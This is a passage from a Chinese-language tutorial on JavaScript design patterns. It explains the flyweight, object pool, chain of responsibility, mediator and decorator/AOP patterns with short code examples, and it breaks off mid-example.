<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br></div></div><h2 id="_27-享元模式"> 27. 享元模式</h2>
<ul>
<li>
<p>享元（flyweight）模式是一种用于性能优化的模式，“fly” 在这里是苍蝇的意思，意为蝇量级。享元模式的核心是运用共享技术来有效支持大量细粒度的对象。</p>
</li>
<li>
<p>如果系统中因为创建了大量类似的对象而导致内存占用过高，享元模式就非常有用了。在 JavaScript 中，浏览器特别是移动端的浏览器分配的内存并不算多，如何节省内存就成了一件非常有意义的事情。</p>
</li>
<li>
<p>小结：享元模式是为解决性能问题而生的模式，这跟大部分模式的诞生原因都不一样。在一个存在大量相似对象的系统中，享元模式可以很好地解决大量对象带来的性能问题。</p>
</li>
</ul>
<div><pre><code><span>// 不使用享元模式</span>
<span>var</span> <span>Model</span> <span>=</span> <span>function</span><span>(</span><span>sex<span>,</span> underwear</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>sex <span>=</span> sex
  <span>this</span><span>.</span>underwear <span>=</span> underwear
<span>}</span>
<span>Model</span><span>.</span>prototype<span>.</span><span>takePhoto</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'sex= '</span> <span>+</span> <span>this</span><span>.</span>sex <span>+</span> <span>' underwear='</span> <span>+</span> <span>this</span><span>.</span>underwear<span>)</span>
<span>}</span>
<span>for</span> <span>(</span><span>var</span> i <span>=</span> <span>1</span><span>;</span> i <span>&lt;=</span> <span>50</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
  <span>var</span> maleModel <span>=</span> <span>new</span> <span>Model</span><span>(</span><span>'male'</span><span>,</span> <span>'underwear'</span> <span>+</span> i<span>)</span>
  maleModel<span>.</span><span>takePhoto</span><span>(</span><span>)</span>
<span>}</span>
<span>for</span> <span>(</span><span>var</span> j <span>=</span> <span>1</span><span>;</span> j <span>&lt;=</span> <span>50</span><span>;</span> j<span>++</span><span>)</span> <span>{</span>
  <span>var</span> femaleModel <span>=</span> <span>new</span> <span>Model</span><span>(</span><span>'female'</span><span>,</span> <span>'underwear'</span> <span>+</span> j<span>)</span>
  femaleModel<span>.</span><span>takePhoto</span><span>(</span><span>)</span>
<span>}</span>

<span>// 使用享元模式（内部状态Model）</span>
<span>var</span> <span>Model</span> <span>=</span> <span>function</span><span>(</span><span>sex</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>sex <span>=</span> sex
<span>}</span>
<span>Model</span><span>.</span>prototype<span>.</span><span>takePhoto</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'sex= '</span> <span>+</span> <span>this</span><span>.</span>sex <span>+</span> <span>' underwear='</span> <span>+</span> <span>this</span><span>.</span>underwear<span>)</span>
<span>}</span>

<span>var</span> maleModel <span>=</span> <span>new</span> <span>Model</span><span>(</span><span>'male'</span><span>)</span><span>,</span>
  femaleModel <span>=</span> <span>new</span> <span>Model</span><span>(</span><span>'female'</span><span>)</span>

<span>for</span> <span>(</span><span>var</span> i <span>=</span> <span>1</span><span>;</span> i <span>&lt;=</span> <span>50</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
  maleModel<span>.</span>underwear <span>=</span> <span>'underwear'</span> <span>+</span> i
  maleModel<span>.</span><span>takePhoto</span><span>(</span><span>)</span>
<span>}</span>

<span>for</span> <span>(</span><span>var</span> j <span>=</span> <span>1</span><span>;</span> j <span>&lt;=</span> <span>50</span><span>;</span> j<span>++</span><span>)</span> <span>{</span>
  femaleModel<span>.</span>underwear <span>=</span> <span>'underwear'</span> <span>+</span> j
  femaleModel<span>.</span><span>takePhoto</span><span>(</span><span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br></div></div><h2 id="_28-内部状态与外部状态"> 28. 内部状态与外部状态</h2>
<ul>
<li>
<p>享元模式要求将对象的属性划分为内部状态与外部状态（状态在这里通常指属性）。享元模式的目标是尽量减少共享对象的数量，关于如何划分内部状态和外部状态，下面的几条经验提供了一些指引。</p>
<blockquote>
<ul>
<li>内部状态存储于对象内部。</li>
<li>内部状态可以被一些对象共享。</li>
<li>内部状态独立于具体的场景，通常不会改变。</li>
<li>外部状态取决于具体的场景，并根据场景而变化，外部状态不能被共享。</li>
</ul>
</blockquote>
</li>
<li>
<p>这样一来，我们便可以把所有内部状态相同的对象都指定为同一个共享的对象。而外部状态可以从对象身上剥离出来，并储存在外部。</p>
</li>
</ul>
<h2 id="_29-享元模式的适用性"> 29. 享元模式的适用性</h2>
<ul>
<li>
<p>享元模式带来的好处很大程度上取决于如何使用以及何时使用，一般来说，以下情况发生时
便可以使用享元模式。</p>
<blockquote>
<ul>
<li>一个程序中使用了大量的相似对象。</li>
<li>由于使用了大量对象，造成很大的内存开销。</li>
<li>对象的大多数状态都可以变为外部状态。</li>
<li>剥离出对象的外部状态之后，可以用相对较少的共享对象取代大量对象。</li>
</ul>
</blockquote>
</li>
</ul>
<h2 id="_30-通用对象池实现"> 30. 通用对象池实现</h2>
<ul>
<li>对象池是另外一种性能优化方案，它跟享元模式有一些相似之处，但没有分离内部状态和外部状态这个过程。</li>
</ul>
<div><pre><code><span>var</span> <span>objectPoolFactory</span> <span>=</span> <span>function</span><span>(</span><span>createObjFn</span><span>)</span> <span>{</span>
  <span>var</span> objectPool <span>=</span> <span>[</span><span>]</span>
  <span>return</span> <span>{</span>
    <span>create</span><span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
      <span>var</span> obj <span>=</span>
        objectPool<span>.</span>length <span>===</span> <span>0</span>
          <span>?</span> <span>createObjFn</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> arguments<span>)</span>
          <span>:</span> objectPool<span>.</span><span>shift</span><span>(</span><span>)</span>
      <span>return</span> obj
    <span>}</span><span>,</span>
    <span>recover</span><span>:</span> <span>function</span><span>(</span><span>obj</span><span>)</span> <span>{</span>
      objectPool<span>.</span><span>push</span><span>(</span>obj<span>)</span>
    <span>}</span><span>,</span>
  <span>}</span>
<span>}</span>

<span>var</span> iframeFactory <span>=</span> <span>objectPoolFactory</span><span>(</span><span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>var</span> iframe <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>'iframe'</span><span>)</span>
  document<span>.</span>body<span>.</span><span>appendChild</span><span>(</span>iframe<span>)</span>
  iframe<span>.</span><span>onload</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    iframe<span>.</span>onload <span>=</span> <span>null</span> <span>// 防止 iframe 重复加载的 bug</span>
    iframeFactory<span>.</span><span>recover</span><span>(</span>iframe<span>)</span> <span>// iframe 加载完成之后回收节点</span>
  <span>}</span>
  <span>return</span> iframe
<span>}</span><span>)</span>
<span>var</span> iframe1 <span>=</span> iframeFactory<span>.</span><span>create</span><span>(</span><span>)</span>
iframe1<span>.</span>src <span>=</span> <span>'http:// baidu.com'</span>
<span>var</span> iframe2 <span>=</span> iframeFactory<span>.</span><span>create</span><span>(</span><span>)</span>
iframe2<span>.</span>src <span>=</span> <span>'http:// QQ.com'</span>
<span>setTimeout</span><span>(</span><span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>var</span> iframe3 <span>=</span> iframeFactory<span>.</span><span>create</span><span>(</span><span>)</span>
  iframe3<span>.</span>src <span>=</span> <span>'http:// 163.com'</span>
<span>}</span><span>,</span> <span>3000</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br></div></div><h2 id="_31-职责链模式"> 31. 职责链模式</h2>
<ul>
<li>
<p>职责链模式的定义是：使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系，将这些对象连成一条链，并沿着这条链传递该请求，直到有一个对象处理它为止。</p>
</li>
<li>
<p>职责链模式的最大优点：请求发送者只需要知道链中的第一个节点，从而弱化了发送者和一组接收者之间的强联系。</p>
</li>
<li>
<p>小结：在 JavaScript 开发中，职责链模式是最容易被忽视的模式之一。实际上只要运用得当，职责链模式可以很好地帮助我们管理代码，降低发起请求的对象和处理请求的对象之间的耦合性。职责链中的节点数量和顺序是可以自由变化的，我们可以在运行时决定链中包含哪些节点。</p>
</li>
</ul>
<h2 id="_32-灵活可拆分的职责链节点"> 32. 灵活可拆分的职责链节点</h2>
<div><pre><code><span>// 我们约定，如果某个节点不能处理请求，则返回一个特定的字符串 'nextSuccessor' 来表示该请求需要继续往后面传递</span>
<span>var</span> <span>order500</span> <span>=</span> <span>function</span><span>(</span><span>orderType<span>,</span> pay<span>,</span> stock</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>orderType <span>===</span> <span>1</span> <span>&amp;&amp;</span> pay <span>===</span> <span>true</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'500 元定金预购，得到 100 优惠券'</span><span>)</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>return</span> <span>'nextSuccessor'</span> <span>// 我不知道下一个节点是谁，反正把请求往后面传递</span>
  <span>}</span>
<span>}</span>
<span>var</span> <span>order200</span> <span>=</span> <span>function</span><span>(</span><span>orderType<span>,</span> pay<span>,</span> stock</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>orderType <span>===</span> <span>2</span> <span>&amp;&amp;</span> pay <span>===</span> <span>true</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'200 元定金预购，得到 50 优惠券'</span><span>)</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>return</span> <span>'nextSuccessor'</span> <span>// 我不知道下一个节点是谁，反正把请求往后面传递</span>
  <span>}</span>
<span>}</span>
<span>var</span> <span>orderNormal</span> <span>=</span> <span>function</span><span>(</span><span>orderType<span>,</span> pay<span>,</span> stock</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>stock <span>></span> <span>0</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'普通购买，无优惠券'</span><span>)</span>
  <span>}</span> <span>else</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'手机库存不足'</span><span>)</span>
  <span>}</span>
<span>}</span>

<span>// Chain.prototype.setNextSuccessor 指定在链中的下一个节点</span>
<span>// Chain.prototype.passRequest 传递请求给某个节点</span>
<span>var</span> <span>Chain</span> <span>=</span> <span>function</span><span>(</span><span>fn</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>fn <span>=</span> fn
  <span>this</span><span>.</span>successor <span>=</span> <span>null</span>
<span>}</span>
<span>Chain</span><span>.</span>prototype<span>.</span><span>setNextSuccessor</span> <span>=</span> <span>function</span><span>(</span><span>successor</span><span>)</span> <span>{</span>
  <span>return</span> <span>(</span><span>this</span><span>.</span>successor <span>=</span> successor<span>)</span>
<span>}</span>
<span>Chain</span><span>.</span>prototype<span>.</span><span>passRequest</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>var</span> ret <span>=</span> <span>this</span><span>.</span><span>fn</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> arguments<span>)</span>
  <span>if</span> <span>(</span>ret <span>===</span> <span>'nextSuccessor'</span><span>)</span> <span>{</span>
    <span>return</span> <span>(</span>
      <span>this</span><span>.</span>successor <span>&amp;&amp;</span>
      <span>this</span><span>.</span>successor<span>.</span><span>passRequest</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>.</span>successor<span>,</span> arguments<span>)</span>
    <span>)</span>
  <span>}</span>
  <span>return</span> ret
<span>}</span>

<span>// 把 3个订单函数分别包装成职责链的节点</span>
<span>var</span> chainOrder500 <span>=</span> <span>new</span> <span>Chain</span><span>(</span>order500<span>)</span>
<span>var</span> chainOrder200 <span>=</span> <span>new</span> <span>Chain</span><span>(</span>order200<span>)</span>
<span>var</span> chainOrderNormal <span>=</span> <span>new</span> <span>Chain</span><span>(</span>orderNormal<span>)</span>

<span>// 指定节点在职责链中的顺序</span>
chainOrder500<span>.</span><span>setNextSuccessor</span><span>(</span>chainOrder200<span>)</span>
chainOrder200<span>.</span><span>setNextSuccessor</span><span>(</span>chainOrderNormal<span>)</span>

<span>// 把请求传递给第一个节点</span>
chainOrder500<span>.</span><span>passRequest</span><span>(</span><span>1</span><span>,</span> <span>true</span><span>,</span> <span>500</span><span>)</span> <span>// 输出：500 元定金预购，得到 100 优惠券</span>
chainOrder500<span>.</span><span>passRequest</span><span>(</span><span>2</span><span>,</span> <span>true</span><span>,</span> <span>500</span><span>)</span> <span>// 输出：200 元定金预购，得到 50 优惠券</span>
chainOrder500<span>.</span><span>passRequest</span><span>(</span><span>3</span><span>,</span> <span>true</span><span>,</span> <span>500</span><span>)</span> <span>// 输出：普通购买，无优惠券</span>
chainOrder500<span>.</span><span>passRequest</span><span>(</span><span>1</span><span>,</span> <span>false</span><span>,</span> <span>0</span><span>)</span> <span>// 输出：手机库存不足</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br></div></div><h2 id="_33-中介者模式"> 33. 中介者模式</h2>
<ul>
<li>
<p>中介者模式的作用就是解除对象与对象之间的紧耦合关系。增加一个中介者对象后，所有的相关对象都通过中介者对象来通信，而不是互相引用，所以当一个对象发生改变时，只需要通知中介者对象即可。中介者使各对象之间耦合松散，而且可以独立地改变它们之间的交互。中介者模式使网状的多对多关系变成了相对简单的一对多关系。</p>
</li>
<li>
<p>小结。</p>
<blockquote>
<ul>
<li>中介者模式是迎合迪米特法则的一种实现。迪米特法则也叫最少知识原则，是指一个对象应该尽可能少地了解另外的对象（类似不和陌生人说话）。如果对象之间的耦合性太高，一个对象发生改变之后，难免会影响到其他的对象，跟 “城门失火，殃及池鱼” 的道理是一样的。而在中介者模式里，对象之间几乎不知道彼此的存在，它们只能通过中介者对象来互相影响对方。</li>
<li>因此，中介者模式使各个对象之间得以解耦，以中介者和对象之间的一对多关系取代了对象之间的网状多对多关系。各个对象只需关注自身功能的实现，对象之间的交互关系交给了中介者对象来实现和维护。</li>
<li>不过，中介者模式也存在一些缺点。其中，最大的缺点是系统中会新增一个中介者对象，因为对象之间交互的复杂性，转移成了中介者对象的复杂性，使得中介者对象经常是巨大的。中介者对象自身往往就是一个难以维护的对象。</li>
</ul>
</blockquote>
</li>
</ul>
<div><pre><code><span>function</span> <span>Player</span><span>(</span><span>name</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>name <span>=</span> name
  <span>this</span><span>.</span>enemy <span>=</span> <span>null</span> <span>// 敌人</span>
<span>}</span>
<span>Player</span><span>.</span>prototype<span>.</span><span>win</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name <span>+</span> <span>' won '</span><span>)</span>
<span>}</span>
<span>Player</span><span>.</span>prototype<span>.</span><span>lose</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name <span>+</span> <span>' lost'</span><span>)</span>
<span>}</span>
<span>Player</span><span>.</span>prototype<span>.</span><span>die</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span><span>lose</span><span>(</span><span>)</span>
  <span>this</span><span>.</span>enemy<span>.</span><span>win</span><span>(</span><span>)</span>
<span>}</span>

<span>// 接下来创建 2个玩家对象</span>
<span>var</span> player1 <span>=</span> <span>new</span> <span>Player</span><span>(</span><span>'皮蛋'</span><span>)</span>
<span>var</span> player2 <span>=</span> <span>new</span> <span>Player</span><span>(</span><span>'小乖'</span><span>)</span>
<span>// 给玩家相互设置敌人</span>
player1<span>.</span>enemy <span>=</span> player2
player2<span>.</span>enemy <span>=</span> player1

player1<span>.</span><span>die</span><span>(</span><span>)</span> <span>// 输出：皮蛋 lost、小乖 won</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></div></div><h2 id="_34-装饰者模式"> 34. 装饰者模式</h2>
<ul>
<li>
<p>在程序开发中，许多时候都并不希望某个类天生就非常庞大，一次性包含许多职责。那么我们就可以使用装饰者模式，装饰者模式可以动态地给某个对象添加一些额外的职责，而不会影响从这个类中派生的其他对象。</p>
</li>
<li>
<p>装饰者模式能够在不改变对象自身的基础上，在程序运行期间给对象动态地添加职责。跟继承相比，装饰者是一种更轻便灵活的做法，这是一种 “即用即付” 的方式。</p>
</li>
</ul>
<h2 id="_35-模拟传统面向对象语言的装饰者模式"> 35. 模拟传统面向对象语言的装饰者模式</h2>
<ul>
<li>作为一门解释执行的语言，给 JavaScript 中的对象动态添加或者改变职责是一件再简单不过的事情，虽然这种做法改动了对象自身，跟传统定义中的装饰者模式并不一样，但这无疑更符合 JavaScript 的语言特色。传统面向对象语言中的装饰者模式在 JavaScript 中适用的场景并不多。</li>
</ul>
<div><pre><code><span>var</span> obj <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'sven'</span><span>,</span>
  <span>address</span><span>:</span> <span>'深圳市'</span><span>,</span>
<span>}</span>
obj<span>.</span>address <span>=</span> obj<span>.</span>address <span>+</span> <span>'福田区'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><ul>
<li>传统面向对象语言中的装饰者模式实现。</li>
</ul>
<div><pre><code><span>// 原始的飞机类</span>
<span>var</span> <span>Plane</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span><span>}</span>
<span>Plane</span><span>.</span>prototype<span>.</span><span>fire</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'发射普通子弹'</span><span>)</span>
<span>}</span>

<span>// 装饰类</span>
<span>var</span> <span>MissileDecorator</span> <span>=</span> <span>function</span><span>(</span><span>plane</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>plane <span>=</span> plane
<span>}</span>
<span>MissileDecorator</span><span>.</span>prototype<span>.</span><span>fire</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>plane<span>.</span><span>fire</span><span>(</span><span>)</span>
  console<span>.</span><span>log</span><span>(</span><span>'发射导弹'</span><span>)</span>
<span>}</span>
<span>var</span> <span>AtomDecorator</span> <span>=</span> <span>function</span><span>(</span><span>plane</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>plane <span>=</span> plane
<span>}</span>
<span>AtomDecorator</span><span>.</span>prototype<span>.</span><span>fire</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>plane<span>.</span><span>fire</span><span>(</span><span>)</span>
  console<span>.</span><span>log</span><span>(</span><span>'发射原子弹'</span><span>)</span>
<span>}</span>

<span>var</span> plane <span>=</span> <span>new</span> <span>Plane</span><span>(</span><span>)</span>
plane <span>=</span> <span>new</span> <span>MissileDecorator</span><span>(</span>plane<span>)</span>
plane <span>=</span> <span>new</span> <span>AtomDecorator</span><span>(</span>plane<span>)</span>
plane<span>.</span><span>fire</span><span>(</span><span>)</span>
<span>// 分别输出： 发射普通子弹、发射导弹、发射原子弹</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br></div></div><h2 id="_36-回到-javascript-的装饰者"> 36. 回到 JavaScript 的装饰者</h2>
<ul>
<li>JavaScript 语言动态改变对象相当容易，我们可以直接改写对象或者对象的某个方法，并不需要使用 “类” 来实现装饰者模式。</li>
</ul>
<div><pre><code><span>var</span> plane <span>=</span> <span>{</span>
  <span>fire</span><span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'发射普通子弹'</span><span>)</span>
  <span>}</span><span>,</span>
<span>}</span>
<span>var</span> <span>missileDecorator</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'发射导弹'</span><span>)</span>
<span>}</span>
<span>var</span> <span>atomDecorator</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'发射原子弹'</span><span>)</span>
<span>}</span>
<span>var</span> fire1 <span>=</span> plane<span>.</span>fire
plane<span>.</span><span>fire</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>fire1</span><span>(</span><span>)</span>
  <span>missileDecorator</span><span>(</span><span>)</span>
<span>}</span>
<span>var</span> fire2 <span>=</span> plane<span>.</span>fire
plane<span>.</span><span>fire</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>fire2</span><span>(</span><span>)</span>
  <span>atomDecorator</span><span>(</span><span>)</span>
<span>}</span>
plane<span>.</span><span>fire</span><span>(</span><span>)</span>
<span>// 分别输出： 发射普通子弹、发射导弹、发射原子弹</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></div></div><h2 id="_37-用-aop-装饰函数"> 37. 用 AOP 装饰函数</h2>
<div><pre><code><span>Function</span><span>.</span>prototype<span>.</span><span>before</span> <span>=</span> <span>function</span><span>(</span><span>beforefn</span><span>)</span> <span>{</span>
  <span>var</span> __self <span>=</span> <span>this</span> <span>// 保存原函数的引用</span>
  <span>return</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>// 返回包含了原函数和新函数的"代理"函数</span>
    <span>beforefn</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> arguments<span>)</span> <span>// 执行新函数，且保证 this 不被劫持，新函数接受的参数</span>
    <span>// 也会被原封不动地传入原函数，新函数在原函数之前执行</span>
    <span>return</span> <span>__self</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> arguments<span>)</span> <span>// 执行原函数并返回原函数的执行结果，</span>
    <span>// 并且保证 this 不被劫持</span>
  <span>}</span>
<span>}</span>
<span>Function</span><span>.</span>prototype<span>.</span><span>after</span> <span>=</span> <span>function</span><span>(</span><span>afterfn</span><span>)</span> <span>{</span>
  <span>var</span> __self <span>=</span> <span>this</span>
  <span>return</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>var</span> ret <span>=</span> <span>__self</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> arguments<span>)</span>
    <span>afterfn</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> arguments<span>)</span>
    <span>return</span> ret
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div><ul>
<li>数据统计上报。</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>button</span> <span>tag</span><span><span>=</span><span>"</span>login<span>"</span></span> <span>id</span><span><span>=</span><span>"</span>button<span>"</span></span><span>></span></span>点击打开登录浮层<span><span><span>&lt;/</span>button</span><span>></span></span>
</code></pre>
<div><span>1</span><br></div></div><div><pre><code><span>Function</span><span>.</span>prototype<span>.</span><span>after</span> <span>=</span> <span>function</span><span>(</span><span>afterfn</span><span>)</span> <span>{</span>
  <span>var</span> __self <span>=</span> <span>this</span>
  <span>return</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>var</span> ret <span>=</span> <span>__self</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> arguments<span>)</span>
    <span>afterfn</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> arguments<span>)</span>
    <span>return</span> ret
  <span>}</span>
<span>}</span>
<span>var</span> <span>showLogin</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'打开登录浮层'</span><span>)</span>
<span>}</span>
<span>var</span> <span>log</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'上报标签为: '</span> <span>+</span> <span>this</span><span>.</span><span>getAttribute</span><span>(</span><span>'tag'</span><span>)</span><span>)</span>
<span>}</span>
showLogin <span>=</span> showLogin<span>.</span><span>after</span><span>(</span>log<span>)</span> <span>// 打开登录浮层之后上报数据</span>
document<span>.</span><span>getElementById</span><span>(</span><span>'button'</span><span>)</span><span>.</span>onclick <span>=</span> showLogin
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><ul>
<li>用 AOP 动态改变函数的参数。</li>
</ul>
<div><pre><code><span>Function</span><span>.</span>prototype<span>.</span><span>before</span> <span>=</span> <span>function</span><span>(</span><span>beforefn</span><span>)</span> <span>{</span>
  <span>var</span> __self <span>=</span> <span>this</span>
  <span>return</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>beforefn</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> arguments<span>)</span> <span>// (1)</span>
    <span>return</span> <span>__self</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> arguments<span>)</span> <span>// (2)</span>
  <span>}</span>
<span>}</span>

<span>// 示例一</span>
<span>var</span> <span>func</span> <span>=</span> <span>function</span><span>(</span><span>param</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span>param<span>)</span> <span>// 输出： {a: "a", b: "b"}</span>
<span>}</span>
func <span>=</span> func<span>.</span><span>before</span><span>(</span><span>function</span><span>(</span><span>param</span><span>)</span> <span>{</span>
  param<span>.</span>b <span>=</span> <span>'b'</span>
<span>}</span><span>)</span>
<span>func</span><span>(</span><span>{</span> <span>a</span><span>:</span> <span>'a'</span> <span>}</span><span>)</span>

<span>// 示例二</span>
<span>var</span> <span>getToken</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>return</span> <span>'Token'</span>
<span>}</span>
ajax <span>=</span> ajax<span>.</span><span>before</span><span>(</span><span>function</span><span>(</span><span>type<span>,</span> url<span>,</span> param</span><span>)</span> <span>{</span>
